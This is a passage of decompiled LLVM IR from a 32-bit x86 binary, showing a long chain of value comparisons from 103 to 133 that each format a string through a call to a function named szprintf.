  %v4_804b2bb = call i32 @szprintf(i32 %v2_804b2a9, i32 ptrtoint ([12 x i8]* @global_var_80595d6.129 to i32), i32 %v1_804b29a)
  br label %dec_label_pc_804b2c0

dec_label_pc_804b2c0:                             ; preds = %dec_label_pc_804b28a, %dec_label_pc_804b290
  %v13_804b2c0 = icmp eq i32 %v2_8049ce5, 103
  %v1_804b2c4 = icmp eq i1 %v13_804b2c0, false
  br i1 %v1_804b2c4, label %dec_label_pc_804b2f6, label %dec_label_pc_804b2c6

dec_label_pc_804b2c6:                             ; preds = %dec_label_pc_804b2c0
  %v0_804b2c6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b2c6 = zext i8 %v0_804b2c6 to i32
  store i32 %v1_804b2c6, i32* @edx, align 4
  %v0_804b2d0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b2d0 = zext i8 %v0_804b2d0 to i32
  %v2_804b2df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2df, i32* @ebx, align 4
  %v4_804b2f1 = call i32 @szprintf(i32 %v2_804b2df, i32 ptrtoint ([13 x i8]* @global_var_80595e2.130 to i32), i32 %v1_804b2d0)
  br label %dec_label_pc_804b2f6

dec_label_pc_804b2f6:                             ; preds = %dec_label_pc_804b2c0, %dec_label_pc_804b2c6
  %v13_804b2f6 = icmp eq i32 %v2_8049ce5, 104
  %v1_804b2fa = icmp eq i1 %v13_804b2f6, false
  br i1 %v1_804b2fa, label %dec_label_pc_804b32c, label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2f6
  %v0_804b2fc = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b2fc = zext i8 %v0_804b2fc to i32
  store i32 %v1_804b2fc, i32* @edx, align 4
  %v0_804b306 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b306 = zext i8 %v0_804b306 to i32
  %v2_804b315 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b315, i32* @ebx, align 4
  %v4_804b327 = call i32 @szprintf(i32 %v2_804b315, i32 ptrtoint ([13 x i8]* @global_var_80595ef.131 to i32), i32 %v1_804b306)
  br label %dec_label_pc_804b32c

dec_label_pc_804b32c:                             ; preds = %dec_label_pc_804b2f6, %dec_label_pc_804b2fc
  %v13_804b32c = icmp eq i32 %v2_8049ce5, 105
  %v1_804b330 = icmp eq i1 %v13_804b32c, false
  br i1 %v1_804b330, label %dec_label_pc_804b362, label %dec_label_pc_804b332

dec_label_pc_804b332:                             ; preds = %dec_label_pc_804b32c
  %v0_804b332 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b332 = zext i8 %v0_804b332 to i32
  store i32 %v1_804b332, i32* @edx, align 4
  %v0_804b33c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b33c = zext i8 %v0_804b33c to i32
  %v2_804b34b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b34b, i32* @ebx, align 4
  %v4_804b35d = call i32 @szprintf(i32 %v2_804b34b, i32 ptrtoint ([13 x i8]* @global_var_80595fc.132 to i32), i32 %v1_804b33c)
  br label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b32c, %dec_label_pc_804b332
  %v13_804b362 = icmp eq i32 %v2_8049ce5, 106
  %v1_804b366 = icmp eq i1 %v13_804b362, false
  br i1 %v1_804b366, label %dec_label_pc_804b398, label %dec_label_pc_804b368

dec_label_pc_804b368:                             ; preds = %dec_label_pc_804b362
  %v0_804b368 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b368 = zext i8 %v0_804b368 to i32
  store i32 %v1_804b368, i32* @edx, align 4
  %v0_804b372 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b372 = zext i8 %v0_804b372 to i32
  %v2_804b381 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b381, i32* @ebx, align 4
  %v4_804b393 = call i32 @szprintf(i32 %v2_804b381, i32 ptrtoint ([12 x i8]* @global_var_8059609.133 to i32), i32 %v1_804b372)
  br label %dec_label_pc_804b398

dec_label_pc_804b398:                             ; preds = %dec_label_pc_804b362, %dec_label_pc_804b368
  %v13_804b398 = icmp eq i32 %v2_8049ce5, 107
  %v1_804b39c = icmp eq i1 %v13_804b398, false
  br i1 %v1_804b39c, label %dec_label_pc_804b3ce, label %dec_label_pc_804b39e

dec_label_pc_804b39e:                             ; preds = %dec_label_pc_804b398
  %v0_804b39e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b39e = zext i8 %v0_804b39e to i32
  store i32 %v1_804b39e, i32* @edx, align 4
  %v0_804b3a8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b3a8 = zext i8 %v0_804b3a8 to i32
  %v2_804b3b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3b7, i32* @ebx, align 4
  %v4_804b3c9 = call i32 @szprintf(i32 %v2_804b3b7, i32 ptrtoint ([13 x i8]* @global_var_8059615.134 to i32), i32 %v1_804b3a8)
  br label %dec_label_pc_804b3ce

dec_label_pc_804b3ce:                             ; preds = %dec_label_pc_804b398, %dec_label_pc_804b39e
  %v13_804b3ce = icmp eq i32 %v2_8049ce5, 108
  %v1_804b3d2 = icmp eq i1 %v13_804b3ce, false
  br i1 %v1_804b3d2, label %dec_label_pc_804b404, label %dec_label_pc_804b3d4

dec_label_pc_804b3d4:                             ; preds = %dec_label_pc_804b3ce
  %v0_804b3d4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b3d4 = zext i8 %v0_804b3d4 to i32
  store i32 %v1_804b3d4, i32* @edx, align 4
  %v0_804b3de = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b3de = zext i8 %v0_804b3de to i32
  %v2_804b3ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ed, i32* @ebx, align 4
  %v4_804b3ff = call i32 @szprintf(i32 %v2_804b3ed, i32 ptrtoint ([14 x i8]* @global_var_8059622.135 to i32), i32 %v1_804b3de)
  br label %dec_label_pc_804b404

dec_label_pc_804b404:                             ; preds = %dec_label_pc_804b3ce, %dec_label_pc_804b3d4
  %v13_804b404 = icmp eq i32 %v2_8049ce5, 109
  %v1_804b408 = icmp eq i1 %v13_804b404, false
  br i1 %v1_804b408, label %dec_label_pc_804b43a, label %dec_label_pc_804b40a

dec_label_pc_804b40a:                             ; preds = %dec_label_pc_804b404
  %v0_804b40a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b40a = zext i8 %v0_804b40a to i32
  store i32 %v1_804b40a, i32* @edx, align 4
  %v0_804b414 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b414 = zext i8 %v0_804b414 to i32
  %v2_804b423 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b423, i32* @ebx, align 4
  %v4_804b435 = call i32 @szprintf(i32 %v2_804b423, i32 ptrtoint ([14 x i8]* @global_var_8059630.136 to i32), i32 %v1_804b414)
  br label %dec_label_pc_804b43a

dec_label_pc_804b43a:                             ; preds = %dec_label_pc_804b404, %dec_label_pc_804b40a
  %v13_804b43a = icmp eq i32 %v2_8049ce5, 110
  %v1_804b43e = icmp eq i1 %v13_804b43a, false
  br i1 %v1_804b43e, label %dec_label_pc_804b470, label %dec_label_pc_804b440

dec_label_pc_804b440:                             ; preds = %dec_label_pc_804b43a
  %v0_804b440 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b440 = zext i8 %v0_804b440 to i32
  store i32 %v1_804b440, i32* @edx, align 4
  %v0_804b44a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b44a = zext i8 %v0_804b44a to i32
  %v2_804b459 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b459, i32* @ebx, align 4
  %v4_804b46b = call i32 @szprintf(i32 %v2_804b459, i32 ptrtoint ([13 x i8]* @global_var_805963e.137 to i32), i32 %v1_804b44a)
  br label %dec_label_pc_804b470

dec_label_pc_804b470:                             ; preds = %dec_label_pc_804b43a, %dec_label_pc_804b440
  %v13_804b470 = icmp eq i32 %v2_8049ce5, 111
  %v1_804b474 = icmp eq i1 %v13_804b470, false
  br i1 %v1_804b474, label %dec_label_pc_804b4a6, label %dec_label_pc_804b476

dec_label_pc_804b476:                             ; preds = %dec_label_pc_804b470
  %v0_804b476 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b476 = zext i8 %v0_804b476 to i32
  store i32 %v1_804b476, i32* @edx, align 4
  %v0_804b480 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b480 = zext i8 %v0_804b480 to i32
  %v2_804b48f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b48f, i32* @ebx, align 4
  %v4_804b4a1 = call i32 @szprintf(i32 %v2_804b48f, i32 ptrtoint ([14 x i8]* @global_var_805964b.138 to i32), i32 %v1_804b480)
  br label %dec_label_pc_804b4a6

dec_label_pc_804b4a6:                             ; preds = %dec_label_pc_804b470, %dec_label_pc_804b476
  %v10_804b4a6 = icmp eq i32 %v2_8049ce5, 112
  %v1_804b4aa = icmp eq i1 %v10_804b4a6, false
  br i1 %v1_804b4aa, label %dec_label_pc_804b4dc, label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b4a6
  %v0_804b4ac = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b4ac = zext i8 %v0_804b4ac to i32
  store i32 %v1_804b4ac, i32* @edx, align 4
  %v0_804b4b6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b4b6 = zext i8 %v0_804b4b6 to i32
  %v2_804b4c5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4c5, i32* @ebx, align 4
  %v4_804b4d7 = call i32 @szprintf(i32 %v2_804b4c5, i32 ptrtoint ([14 x i8]* @global_var_8059659.139 to i32), i32 %v1_804b4b6)
  br label %dec_label_pc_804b4dc

dec_label_pc_804b4dc:                             ; preds = %dec_label_pc_804b4a6, %dec_label_pc_804b4ac
  %v13_804b4dc = icmp eq i32 %v2_8049ce5, 113
  %v1_804b4e0 = icmp eq i1 %v13_804b4dc, false
  br i1 %v1_804b4e0, label %dec_label_pc_804b512, label %dec_label_pc_804b4e2

dec_label_pc_804b4e2:                             ; preds = %dec_label_pc_804b4dc
  %v0_804b4e2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b4e2 = zext i8 %v0_804b4e2 to i32
  store i32 %v1_804b4e2, i32* @edx, align 4
  %v0_804b4ec = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b4ec = zext i8 %v0_804b4ec to i32
  %v2_804b4fb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4fb, i32* @ebx, align 4
  %v4_804b50d = call i32 @szprintf(i32 %v2_804b4fb, i32 ptrtoint ([13 x i8]* @global_var_8059667.140 to i32), i32 %v1_804b4ec)
  br label %dec_label_pc_804b512

dec_label_pc_804b512:                             ; preds = %dec_label_pc_804b4dc, %dec_label_pc_804b4e2
  %v13_804b512 = icmp eq i32 %v2_8049ce5, 114
  %v1_804b516 = icmp eq i1 %v13_804b512, false
  br i1 %v1_804b516, label %dec_label_pc_804b548, label %dec_label_pc_804b518

dec_label_pc_804b518:                             ; preds = %dec_label_pc_804b512
  %v0_804b518 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b518 = zext i8 %v0_804b518 to i32
  store i32 %v1_804b518, i32* @edx, align 4
  %v0_804b522 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b522 = zext i8 %v0_804b522 to i32
  %v2_804b531 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b531, i32* @ebx, align 4
  %v4_804b543 = call i32 @szprintf(i32 %v2_804b531, i32 ptrtoint ([14 x i8]* @global_var_8059674.141 to i32), i32 %v1_804b522)
  br label %dec_label_pc_804b548

dec_label_pc_804b548:                             ; preds = %dec_label_pc_804b512, %dec_label_pc_804b518
  %v13_804b548 = icmp eq i32 %v2_8049ce5, 115
  %v1_804b54c = icmp eq i1 %v13_804b548, false
  br i1 %v1_804b54c, label %dec_label_pc_804b57e, label %dec_label_pc_804b54e

dec_label_pc_804b54e:                             ; preds = %dec_label_pc_804b548
  %v0_804b54e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b54e = zext i8 %v0_804b54e to i32
  store i32 %v1_804b54e, i32* @edx, align 4
  %v0_804b558 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b558 = zext i8 %v0_804b558 to i32
  %v2_804b567 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b567, i32* @ebx, align 4
  %v4_804b579 = call i32 @szprintf(i32 %v2_804b567, i32 ptrtoint ([13 x i8]* @global_var_8059682.142 to i32), i32 %v1_804b558)
  br label %dec_label_pc_804b57e

dec_label_pc_804b57e:                             ; preds = %dec_label_pc_804b548, %dec_label_pc_804b54e
  %v13_804b57e = icmp eq i32 %v2_8049ce5, 116
  %v1_804b582 = icmp eq i1 %v13_804b57e, false
  br i1 %v1_804b582, label %dec_label_pc_804b5b4, label %dec_label_pc_804b584

dec_label_pc_804b584:                             ; preds = %dec_label_pc_804b57e
  %v0_804b584 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b584 = zext i8 %v0_804b584 to i32
  store i32 %v1_804b584, i32* @edx, align 4
  %v0_804b58e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b58e = zext i8 %v0_804b58e to i32
  %v2_804b59d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b59d, i32* @ebx, align 4
  %v4_804b5af = call i32 @szprintf(i32 %v2_804b59d, i32 ptrtoint ([13 x i8]* @global_var_805968f.143 to i32), i32 %v1_804b58e)
  br label %dec_label_pc_804b5b4

dec_label_pc_804b5b4:                             ; preds = %dec_label_pc_804b57e, %dec_label_pc_804b584
  %v13_804b5b4 = icmp eq i32 %v2_8049ce5, 117
  %v1_804b5b8 = icmp eq i1 %v13_804b5b4, false
  br i1 %v1_804b5b8, label %dec_label_pc_804b5ea, label %dec_label_pc_804b5ba

dec_label_pc_804b5ba:                             ; preds = %dec_label_pc_804b5b4
  %v0_804b5ba = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b5ba = zext i8 %v0_804b5ba to i32
  store i32 %v1_804b5ba, i32* @edx, align 4
  %v0_804b5c4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b5c4 = zext i8 %v0_804b5c4 to i32
  %v2_804b5d3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5d3, i32* @ebx, align 4
  %v4_804b5e5 = call i32 @szprintf(i32 %v2_804b5d3, i32 ptrtoint ([14 x i8]* @global_var_805969c.144 to i32), i32 %v1_804b5c4)
  br label %dec_label_pc_804b5ea

dec_label_pc_804b5ea:                             ; preds = %dec_label_pc_804b5b4, %dec_label_pc_804b5ba
  %v13_804b5ea = icmp eq i32 %v2_8049ce5, 118
  %v1_804b5ee = icmp eq i1 %v13_804b5ea, false
  br i1 %v1_804b5ee, label %dec_label_pc_804b620, label %dec_label_pc_804b5f0

dec_label_pc_804b5f0:                             ; preds = %dec_label_pc_804b5ea
  %v0_804b5f0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b5f0 = zext i8 %v0_804b5f0 to i32
  store i32 %v1_804b5f0, i32* @edx, align 4
  %v0_804b5fa = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b5fa = zext i8 %v0_804b5fa to i32
  %v2_804b609 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b609, i32* @ebx, align 4
  %v4_804b61b = call i32 @szprintf(i32 %v2_804b609, i32 ptrtoint ([14 x i8]* @global_var_80596aa.145 to i32), i32 %v1_804b5fa)
  br label %dec_label_pc_804b620

dec_label_pc_804b620:                             ; preds = %dec_label_pc_804b5ea, %dec_label_pc_804b5f0
  %v13_804b620 = icmp eq i32 %v2_8049ce5, 119
  %v1_804b624 = icmp eq i1 %v13_804b620, false
  br i1 %v1_804b624, label %dec_label_pc_804b656, label %dec_label_pc_804b626

dec_label_pc_804b626:                             ; preds = %dec_label_pc_804b620
  %v0_804b626 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b626 = zext i8 %v0_804b626 to i32
  store i32 %v1_804b626, i32* @edx, align 4
  %v0_804b630 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b630 = zext i8 %v0_804b630 to i32
  %v2_804b63f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b63f, i32* @ebx, align 4
  %v4_804b651 = call i32 @szprintf(i32 %v2_804b63f, i32 ptrtoint ([14 x i8]* @global_var_80596b8.146 to i32), i32 %v1_804b630)
  br label %dec_label_pc_804b656

dec_label_pc_804b656:                             ; preds = %dec_label_pc_804b620, %dec_label_pc_804b626
  %v13_804b656 = icmp eq i32 %v2_8049ce5, 120
  %v1_804b65a = icmp eq i1 %v13_804b656, false
  br i1 %v1_804b65a, label %dec_label_pc_804b68c, label %dec_label_pc_804b65c

dec_label_pc_804b65c:                             ; preds = %dec_label_pc_804b656
  %v0_804b65c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b65c = zext i8 %v0_804b65c to i32
  store i32 %v1_804b65c, i32* @edx, align 4
  %v0_804b666 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b666 = zext i8 %v0_804b666 to i32
  %v2_804b675 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b675, i32* @ebx, align 4
  %v4_804b687 = call i32 @szprintf(i32 %v2_804b675, i32 ptrtoint ([14 x i8]* @global_var_80596c6.147 to i32), i32 %v1_804b666)
  br label %dec_label_pc_804b68c

dec_label_pc_804b68c:                             ; preds = %dec_label_pc_804b656, %dec_label_pc_804b65c
  %v13_804b68c = icmp eq i32 %v2_8049ce5, 121
  %v1_804b690 = icmp eq i1 %v13_804b68c, false
  br i1 %v1_804b690, label %dec_label_pc_804b6c2, label %dec_label_pc_804b692

dec_label_pc_804b692:                             ; preds = %dec_label_pc_804b68c
  %v0_804b692 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b692 = zext i8 %v0_804b692 to i32
  store i32 %v1_804b692, i32* @edx, align 4
  %v0_804b69c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b69c = zext i8 %v0_804b69c to i32
  %v2_804b6ab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6ab, i32* @ebx, align 4
  %v4_804b6bd = call i32 @szprintf(i32 %v2_804b6ab, i32 ptrtoint ([14 x i8]* @global_var_8059622.135 to i32), i32 %v1_804b69c)
  br label %dec_label_pc_804b6c2

dec_label_pc_804b6c2:                             ; preds = %dec_label_pc_804b68c, %dec_label_pc_804b692
  %v13_804b6c2 = icmp eq i32 %v2_8049ce5, 122
  %v1_804b6c6 = icmp eq i1 %v13_804b6c2, false
  br i1 %v1_804b6c6, label %dec_label_pc_804b6f8, label %dec_label_pc_804b6c8

dec_label_pc_804b6c8:                             ; preds = %dec_label_pc_804b6c2
  %v0_804b6c8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b6c8 = zext i8 %v0_804b6c8 to i32
  store i32 %v1_804b6c8, i32* @edx, align 4
  %v0_804b6d2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b6d2 = zext i8 %v0_804b6d2 to i32
  %v2_804b6e1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6e1, i32* @ebx, align 4
  %v4_804b6f3 = call i32 @szprintf(i32 %v2_804b6e1, i32 ptrtoint ([13 x i8]* @global_var_80596d4.148 to i32), i32 %v1_804b6d2)
  br label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6c2, %dec_label_pc_804b6c8
  %v13_804b6f8 = icmp eq i32 %v2_8049ce5, 123
  %v1_804b6fc = icmp eq i1 %v13_804b6f8, false
  br i1 %v1_804b6fc, label %dec_label_pc_804b72e, label %dec_label_pc_804b6fe

dec_label_pc_804b6fe:                             ; preds = %dec_label_pc_804b6f8
  %v0_804b6fe = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b6fe = zext i8 %v0_804b6fe to i32
  store i32 %v1_804b6fe, i32* @edx, align 4
  %v0_804b708 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b708 = zext i8 %v0_804b708 to i32
  %v2_804b717 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b717, i32* @ebx, align 4
  %v4_804b729 = call i32 @szprintf(i32 %v2_804b717, i32 ptrtoint ([12 x i8]* @global_var_80596e1.149 to i32), i32 %v1_804b708)
  br label %dec_label_pc_804b72e

dec_label_pc_804b72e:                             ; preds = %dec_label_pc_804b6f8, %dec_label_pc_804b6fe
  %v13_804b72e = icmp eq i32 %v2_8049ce5, 124
  %v1_804b732 = icmp eq i1 %v13_804b72e, false
  br i1 %v1_804b732, label %dec_label_pc_804b764, label %dec_label_pc_804b734

dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b72e
  %v0_804b734 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b734 = zext i8 %v0_804b734 to i32
  store i32 %v1_804b734, i32* @edx, align 4
  %v0_804b73e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b73e = zext i8 %v0_804b73e to i32
  %v2_804b74d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b74d, i32* @ebx, align 4
  %v4_804b75f = call i32 @szprintf(i32 %v2_804b74d, i32 ptrtoint ([14 x i8]* @global_var_80596ed.150 to i32), i32 %v1_804b73e)
  br label %dec_label_pc_804b764

dec_label_pc_804b764:                             ; preds = %dec_label_pc_804b72e, %dec_label_pc_804b734
  %v13_804b764 = icmp eq i32 %v2_8049ce5, 125
  %v1_804b768 = icmp eq i1 %v13_804b764, false
  br i1 %v1_804b768, label %dec_label_pc_804b79a, label %dec_label_pc_804b76a

dec_label_pc_804b76a:                             ; preds = %dec_label_pc_804b764
  %v0_804b76a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b76a = zext i8 %v0_804b76a to i32
  store i32 %v1_804b76a, i32* @edx, align 4
  %v0_804b774 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b774 = zext i8 %v0_804b774 to i32
  %v2_804b783 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b783, i32* @ebx, align 4
  %v4_804b795 = call i32 @szprintf(i32 %v2_804b783, i32 ptrtoint ([14 x i8]* @global_var_80596fb.151 to i32), i32 %v1_804b774)
  br label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b764, %dec_label_pc_804b76a
  %v13_804b79a = icmp eq i32 %v2_8049ce5, 126
  %v1_804b79e = icmp eq i1 %v13_804b79a, false
  br i1 %v1_804b79e, label %dec_label_pc_804b7d0, label %dec_label_pc_804b7a0

dec_label_pc_804b7a0:                             ; preds = %dec_label_pc_804b79a
  %v0_804b7a0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b7a0 = zext i8 %v0_804b7a0 to i32
  store i32 %v1_804b7a0, i32* @edx, align 4
  %v0_804b7aa = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b7aa = zext i8 %v0_804b7aa to i32
  %v2_804b7b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b9, i32* @ebx, align 4
  %v4_804b7cb = call i32 @szprintf(i32 %v2_804b7b9, i32 ptrtoint ([14 x i8]* @global_var_80596ed.150 to i32), i32 %v1_804b7aa)
  br label %dec_label_pc_804b7d0

dec_label_pc_804b7d0:                             ; preds = %dec_label_pc_804b79a, %dec_label_pc_804b7a0
  %v13_804b7d0 = icmp eq i32 %v2_8049ce5, 127
  %v1_804b7d4 = icmp eq i1 %v13_804b7d0, false
  br i1 %v1_804b7d4, label %dec_label_pc_804b806, label %dec_label_pc_804b7d6

dec_label_pc_804b7d6:                             ; preds = %dec_label_pc_804b7d0
  %v0_804b7d6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b7d6 = zext i8 %v0_804b7d6 to i32
  store i32 %v1_804b7d6, i32* @edx, align 4
  %v0_804b7e0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b7e0 = zext i8 %v0_804b7e0 to i32
  %v2_804b7ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7ef, i32* @ebx, align 4
  %v4_804b801 = call i32 @szprintf(i32 %v2_804b7ef, i32 ptrtoint ([14 x i8]* @global_var_8059709.152 to i32), i32 %v1_804b7e0)
  br label %dec_label_pc_804b806

dec_label_pc_804b806:                             ; preds = %dec_label_pc_804b7d0, %dec_label_pc_804b7d6
  %v10_804b806 = icmp eq i32 %v2_8049ce5, 128
  %v1_804b80d = icmp eq i1 %v10_804b806, false
  br i1 %v1_804b80d, label %dec_label_pc_804b83f, label %dec_label_pc_804b80f

dec_label_pc_804b80f:                             ; preds = %dec_label_pc_804b806
  %v0_804b80f = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b80f = zext i8 %v0_804b80f to i32
  store i32 %v1_804b80f, i32* @edx, align 4
  %v0_804b819 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b819 = zext i8 %v0_804b819 to i32
  %v2_804b828 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b828, i32* @ebx, align 4
  %v4_804b83a = call i32 @szprintf(i32 %v2_804b828, i32 ptrtoint ([14 x i8]* @global_var_8059717.153 to i32), i32 %v1_804b819)
  br label %dec_label_pc_804b83f

dec_label_pc_804b83f:                             ; preds = %dec_label_pc_804b806, %dec_label_pc_804b80f
  %v13_804b83f = icmp eq i32 %v2_8049ce5, 129
  %v1_804b846 = icmp eq i1 %v13_804b83f, false
  br i1 %v1_804b846, label %dec_label_pc_804b878, label %dec_label_pc_804b848

dec_label_pc_804b848:                             ; preds = %dec_label_pc_804b83f
  %v0_804b848 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b848 = zext i8 %v0_804b848 to i32
  store i32 %v1_804b848, i32* @edx, align 4
  %v0_804b852 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b852 = zext i8 %v0_804b852 to i32
  %v2_804b861 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b861, i32* @ebx, align 4
  %v4_804b873 = call i32 @szprintf(i32 %v2_804b861, i32 ptrtoint ([14 x i8]* @global_var_8059725.154 to i32), i32 %v1_804b852)
  br label %dec_label_pc_804b878

dec_label_pc_804b878:                             ; preds = %dec_label_pc_804b83f, %dec_label_pc_804b848
  %v13_804b878 = icmp eq i32 %v2_8049ce5, 130
  %v1_804b87f = icmp eq i1 %v13_804b878, false
  br i1 %v1_804b87f, label %dec_label_pc_804b8b1, label %dec_label_pc_804b881

dec_label_pc_804b881:                             ; preds = %dec_label_pc_804b878
  %v0_804b881 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b881 = zext i8 %v0_804b881 to i32
  store i32 %v1_804b881, i32* @edx, align 4
  %v0_804b88b = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b88b = zext i8 %v0_804b88b to i32
  %v2_804b89a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b89a, i32* @ebx, align 4
  %v4_804b8ac = call i32 @szprintf(i32 %v2_804b89a, i32 ptrtoint ([14 x i8]* @global_var_8059733.155 to i32), i32 %v1_804b88b)
  br label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b878, %dec_label_pc_804b881
  %v13_804b8b1 = icmp eq i32 %v2_8049ce5, 131
  %v1_804b8b8 = icmp eq i1 %v13_804b8b1, false
  br i1 %v1_804b8b8, label %dec_label_pc_804b8ea, label %dec_label_pc_804b8ba

dec_label_pc_804b8ba:                             ; preds = %dec_label_pc_804b8b1
  %v0_804b8ba = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b8ba = zext i8 %v0_804b8ba to i32
  store i32 %v1_804b8ba, i32* @edx, align 4
  %v0_804b8c4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b8c4 = zext i8 %v0_804b8c4 to i32
  %v2_804b8d3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8d3, i32* @ebx, align 4
  %v4_804b8e5 = call i32 @szprintf(i32 %v2_804b8d3, i32 ptrtoint ([14 x i8]* @global_var_8059741.156 to i32), i32 %v1_804b8c4)
  br label %dec_label_pc_804b8ea

dec_label_pc_804b8ea:                             ; preds = %dec_label_pc_804b8b1, %dec_label_pc_804b8ba
  %v13_804b8ea = icmp eq i32 %v2_8049ce5, 132
  %v1_804b8f1 = icmp eq i1 %v13_804b8ea, false
  br i1 %v1_804b8f1, label %dec_label_pc_804b923, label %dec_label_pc_804b8f3

dec_label_pc_804b8f3:                             ; preds = %dec_label_pc_804b8ea
  %v0_804b8f3 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b8f3 = zext i8 %v0_804b8f3 to i32
  store i32 %v1_804b8f3, i32* @edx, align 4
  %v0_804b8fd = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b8fd = zext i8 %v0_804b8fd to i32
  %v2_804b90c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b90c, i32* @ebx, align 4
  %v4_804b91e = call i32 @szprintf(i32 %v2_804b90c, i32 ptrtoint ([14 x i8]* @global_var_805974f.157 to i32), i32 %v1_804b8fd)
  br label %dec_label_pc_804b923

dec_label_pc_804b923:                             ; preds = %dec_label_pc_804b8ea, %dec_label_pc_804b8f3
  %v13_804b923 = icmp eq i32 %v2_8049ce5, 133
  %v1_804b92a = icmp eq i1 %v13_804b923, false
  br i1 %v1_804b92a, label %dec_label_pc_804b95c, label %dec_label_pc_804b92c

dec_label_pc_804b92c:                             ; preds = %dec_label_pc_804b923
